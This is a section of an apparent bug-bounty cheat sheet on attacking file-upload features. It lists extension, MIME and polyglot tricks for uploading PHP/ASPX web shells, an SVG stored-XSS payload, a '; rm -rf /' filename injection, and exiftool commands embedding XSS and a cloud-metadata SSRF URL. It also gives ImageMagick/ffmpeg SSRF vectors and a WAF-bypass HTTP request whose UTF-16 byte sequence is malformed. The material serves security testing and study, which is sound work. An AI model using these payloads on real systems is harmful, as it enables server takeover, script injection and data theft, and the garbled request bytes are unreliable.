## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**WAF bypass for file upload**: Run `tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type) — *optional wrapper; if absent, apply these same mutations by hand in Burp Repeater*. Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.

### Busboy / Undici Multipart Parser Internals (Node.js / Next.js)

**Parser stack:**
- **Busboy** — Next.js multipart/form-data parser (used when `Content-Type: multipart/form-data`)
- **Undici** — Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests)

**Busboy charset decoder quirk:**

Busboy's `getDecoder(charset)` falls through for UTF-16 aliases:
```
case 'utf16le':
case 'utf-16le':
case 'ucs2':
case 'ucs-2':
  return decoders.utf16le;
```

This means `Content-Type: text/plain; charset=utf16le` on a multipart part causes Busboy to decode the part value as UTF-16LE. A WAF inspecting the raw bytes sees null-byte-padded garbage; Busboy reads valid ASCII/payload.

**Bypass technique (D-0, $100k checkpoint):**

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary=y
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

<0x00><0x8x00><0x4x8H><0x00><0x00><0x6n><0x00><0x8x00>...[UTF-16LE encoded payload]
--y
Content-Disposition: form-data; name="1"

"$0"
--y--
```

The WAF sees raw UTF-16 bytes (null-byte interleaved); Busboy decodes it as plain ASCII payload including `__proto__` / `:constructor` keys.

**WAF ruleset evolution (CTF progression):**

| Version | New Rule | Bypass |
|---|---|---|
| ver.0 | `if ':constructor' in decoded: block()` | UTF-16LE charset on part — decoded string evades check |
| ver.1 | `if part.filename: continue` (skip file parts) | Add `filename=` to Content-Disposition of payload part |
| ver.3 | `if part.charset != 'utf-8': block()` | Use Undici (FormData) path — Undici ignores per-part charset |
| ver.0.5 | `if '__proto__' or ':constructor' in decoded` | Split payload across 2 form fields (`foo` + payload field) |

**Key takeaway for bug hunting:** When a Node.js/Next.js target uses `multipart/form-data` for API actions, test per-part `Content-Type: text/plain; charset=utf16le` on each field. WAFs that inspect raw bytes will miss UTF-16LE payloads that Busboy decodes correctly.

### Payloads Inside "Valid" Images (metadata injection)
An image can pass magic-byte + MIME checks and still carry a payload in its metadata — the sink is wherever the app **renders that metadata back** (gallery captions, EXIF viewers, PDF export).
```bash
# XSS / SSRF in EXIF fields that get echoed unescaped
exiftool -Comment='"><img src=x onerror=alert(document.domain)>' pic.jpg
exiftool -Artist='http://169.254.169.254/latest/meta-data/' pic.jpg
```
- **XML/SVG/XXE:** SVG and Office/DOCX are XML — `<!DOCTYPE ... SYSTEM "http://oob">` in the uploaded file gives XXE/SSRF when the server parses it. (SVG script sink already covered above.)
- **Confirm:** the injected field must reach an HTML/parse sink and fire — an EXIF comment stored but never rendered is Info.

### Image-Processing Sinks (ImageMagick / ffmpeg / libraries)
Servers that *transform* uploads (resize, thumbnail, convert) run the file through a parser with its own RCE/SSRF surface — you don't need code execution on your file, you need a malformed input the processor mishandles.
- **ImageMagick:** the classic MSL/`ephemeral:`/`url:` vectors — a crafted `.mvg`/`.svg` makes IM fetch a URL (SSRF) or read a file. Fingerprint via distinctive error output; test an `image/` upload that references `url:http://oob`.
- **ffmpeg (audio/video upload):** an `.avi`/`.m3u8`/HLS playlist with a `file:`/`http:` entry → SSRF / local-file read into the transcoded output. Upload a playlist pointing at `/etc/passwd` or an OOB host.
- **Confirm:** OOB callback from the processing host, or the leaked file appears in the converted output. FP-kill: many services sandbox the converter — no callback = no finding.

### Polyglot / MIME Confusion
Beyond GIF89a-prefix: build a file that is **simultaneously valid** as the allowed type and the dangerous one, or exploit a MIME/extension mismatch between the *validator* and the *server that executes it* (validator sees PDF, Apache maps `.phtml` to PHP). A JPEG+PHP polyglot survives image re-encoding rarely — prefer targets that store the original. Confirm by fetching the stored URL and proving **execution**, not storage.

